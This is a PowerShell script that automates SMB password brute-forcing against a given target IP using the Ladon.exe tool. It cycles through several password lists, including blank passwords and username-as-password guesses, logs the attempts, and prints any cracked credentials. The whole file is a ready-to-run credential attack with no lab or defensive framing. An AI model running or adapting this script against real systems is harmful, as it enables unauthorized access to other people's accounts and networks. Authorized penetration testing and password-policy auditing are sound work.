$ProgressPreference = 'SilentlyContinue'
   
# Input Switches
[CmdletBinding()]
Param(
    [Parameter(Mandatory = $false,
    HelpMessage = 'Users list')]
    [string]$UserList,

    [Parameter(Mandatory = $false,
    HelpMessage = 'Enter Domain')]
    [string]$Domain,
    
    [Parameter(Mandatory = $true,
    HelpMessage = 'Target IP')]
    [string]$Target,
    
    [Parameter(Mandatory = $false,
    HelpMessage = 'Custom Password list')]
    [string]$PassList     
)

# these are the variables to use in the script
$global:domain2=$Domain
$global:target2=$Target
$global:userlist2=$UserList
$global:passlist=$PassList

if (!$domain2) { 
# if no domain is given then set it to a '.' 
$global:domain2="."
}

if (!$userlist2) { 
$global:userlist2="users.txt"
}


function debug {
echo "target: $target"
echo "userlist: $userlist2"
echo "domain: $domain2"
echo "passlist: $passlist2"
}  



date 
####################################
# Ladon
####################################
function ladon-check-cracked {
Get-Content .\SmbScan.log
}

function ladon-password {
Write-Output ""
Write-Output "[+] password"
Write-Output ""
type pass_password.txt > pass.txt 
.\Ladon.exe $target2 smbscan >> ladon_brute.log #2>$nul
Write-Output ""
ladon-check-cracked
}
function ladon-pass5 {
Write-Output ""
Write-Output "[+] pass5.txt"
Write-Output ""
type pass5.txt > pass.txt 
.\Ladon.exe $target2 smbscan >> ladon_brute.log #2>$nul
Write-Output ""
ladon-check-cracked
}
function ladon-userpass {
Write-Output ""
Write-Output "[+] user = pass"
Write-Output ""
type users.txt > pass.txt
.\Ladon.exe $target2 smbscan >> ladon_brute.log #2>$nul
Write-Output ""
ladon-check-cracked
}
function ladon-blank {
Write-Output ""
Write-Output "[+] pass_blank.txt"
Write-Output ""
type pass_blank.txt > pass.txt
.\Ladon.exe $target2 smbscan >> ladon_brute.log #2>$nul
Write-Output ""
ladon-check-cracked
}
function ladon-pass10 {
Write-Output ""
Write-Output "[+] pass10.txt"
Write-Output ""
type pass10.txt > pass.txt 
.\Ladon.exe $target2 smbscan >> ladon_brute.log #2>$nul
#2>$nul	
Write-Output ""
ladon-check-cracked
}
function ladon-pass100 {
Write-Output ""
Write-Output "[+] pass100.txt"
Write-Output ""
type pass100.txt > pass.txt 
.\Ladon.exe $target2 smbscan >> ladon_brute.log #2>$nul	
Write-Output ""
ladon-check-cracked
}


echo "" > .\ladon_brute.log
type users.txt > user.txt

debug
ladon-password
ladon-pass5
ladon-userpass
ladon-blank
ladon-pass10
ladon-pass100